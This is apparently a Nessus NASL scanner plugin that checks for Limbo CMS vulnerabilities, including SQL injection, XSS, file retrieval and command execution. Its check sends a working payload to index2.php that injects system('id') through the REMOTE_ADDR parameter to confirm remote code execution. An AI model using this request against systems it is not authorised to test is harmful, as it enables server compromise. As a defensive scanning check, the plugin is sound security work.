#
# This script was written by Josh Zlatin-Amishav <josh at ramat dot cc>
# GPLv2
#

include("compat.inc");

if(description)
{
 script_id(20824);
 script_version ("$Revision: 1.6 $");

 script_cve_id("CVE-2005-4317", "CVE-2005-4318", "CVE-2005-4319", "CVE-2005-4320");
 script_bugtraq_id(15871);
 if (defined_func("script_xref")) {
   script_xref(name:"OSVDB", value:"21753");
   script_xref(name:"OSVDB", value:"21754");
   script_xref(name:"OSVDB", value:"21755");
   script_xref(name:"OSVDB", value:"21756");
   script_xref(name:"OSVDB", value:"21757");
   script_xref(name:"OSVDB", value:"21758");
   script_xref(name:"OSVDB", value:"21759");
 }
 
 name["english"] = "Limbo CMS Multiple Vulnerabilities";
 script_name(english:name["english"]);
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
numerous vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Limbo CMS, a content-management system
written in PHP. 

The remote version of this software is vulnerable to several flaws
including :

-  If register_globals is off and Limbo is configured to use a MySQL 
   backend, then an SQL injection is possible due to improper 
   sanitization of the '_SERVER[REMOTE_ADDR]' parameter.
-  The installation path is revealed when the 'doc.inc.php', 
   'element.inc.php', and 'node.inc.php' files are reqeusted when 
   PHP's 'display_errors' setting is enabled.
-  An XSS attack is possible when the Stats module is used due to 
   improper sanitization of the '_SERVER[REMOTE_ADDR]' parameter.
-  Arbitrary PHP files can be retrieved via the 'index2.php' script 
   due to improper sanitation of the 'option' parameter.
-  An attacker can run arbitrary system commands on the remote 
   system via a combination of the SQL injection and directory 
   transversal attacks." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/419470" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6b3b5f19" );
 script_set_attribute(attribute:"solution", value:
"Apply the patch from the references above." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
 script_end_attributes();

 
 summary["english"] = "Checks for multiple vulnerabilities in Limbo";
 script_summary(english:summary["english"]);
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2006-2009 Josh Zlatin-Amishav");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

# The script code starts here

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);


http_check_remote_code(
  extra_dirs:"",
  check_request:string("/index2.php?_SERVER[]=&_SERVER[REMOTE_ADDR]='.system('id').exit().'&option=wrapper&module[module]=1"),
  check_result:"uid=[0-9]+.*gid=[0-9]+.*",
  command:"id",
  port:port,
  xss: 1, sql_inject: 1
);
